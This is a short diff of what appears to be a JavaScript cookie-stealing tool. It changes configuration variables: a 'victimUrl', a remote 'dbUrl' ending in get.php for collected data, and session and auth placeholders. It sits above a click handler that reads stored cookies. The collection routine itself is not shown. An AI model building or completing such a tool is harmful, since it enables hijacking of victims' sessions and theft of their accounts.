@@ -1,8 +1,8 @@
 var cookies = [];
-var sesid = "***";
-var auth = "***";
+var sesid = "user";
+var auth = "pass";
 var victimUrl = "http://***.net";
-var dbUrl = "http://****.esy.es/get.php";
+var dbUrl = "http://***.com/get.php";
 
 function click(id) {
     //alert(JSON.stringify(cookies[id]));
